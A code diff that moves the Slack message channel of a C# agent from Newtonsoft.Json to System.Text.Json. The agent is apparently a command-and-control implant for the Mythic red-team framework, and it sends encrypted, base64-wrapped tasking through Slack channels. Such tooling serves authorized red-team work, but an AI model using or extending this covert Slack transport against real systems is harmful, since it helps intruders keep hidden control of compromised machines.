@@ -6,8 +6,6 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
-using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
 using System.Xml.Linq;
 using Athena.Models.Config;
 using Slack.NetStandard.Auth;
@@ -17,6 +15,7 @@ using Slack.NetStandard.Messages;
 using Slack.NetStandard.WebApi.Files;
 using Slack.NetStandard.Messages.Blocks;
 using Slack.NetStandard.WebApi.Conversations;
+using System.Text.Json;
 
 namespace Athena
 {
@@ -123,12 +122,10 @@ namespace Athena
 
             this.client.Conversations.Join(this.channel);
         }
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
-            string json;
             try
             {
-                json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -167,12 +164,12 @@ namespace Athena
                 //    json += message.Value.message;
                 //}
 
-
+                string strRes;
                 //Take only the most recent response in case some messages got left over.
                 //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                 if (result.FirstOrDefault().Value is not null)
                 {
-                    json = result.FirstOrDefault().Value.message;
+                    strRes = result.FirstOrDefault().Value.message;
                 }
                 else
                 {
@@ -184,12 +181,12 @@ namespace Athena
                 
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(json);
+                    return this.crypt.Decrypt(strRes);
                 }
 
-                if (!string.IsNullOrEmpty(json))
+                if (!string.IsNullOrEmpty(strRes))
                 {
-                    return (await Misc.Base64Decode(json)).Substring(36);
+                    return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
                 return String.Empty;
             }
@@ -215,7 +212,7 @@ namespace Athena
                 {
                     Channels = this.channel,
                     Title = "",
-                    InitialComment = JsonConvert.SerializeObject(msg),
+                    InitialComment = JsonSerializer.Serialize(msg),
                     Content = data,
                     Filetype = "txt"
                 };
@@ -242,7 +239,7 @@ namespace Athena
 
                 request.Blocks.Add(new Section
                 {
-                    Text = new PlainText(JsonConvert.SerializeObject(msg))
+                    Text = new PlainText(JsonSerializer.Serialize(msg))
                 });
 
 
@@ -289,7 +286,7 @@ namespace Athena
                         {
                             if (message.Text.Contains(this.agent_guid))
                             {
-                                MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.Text);
+                                MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text);
 
                                 if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                 {
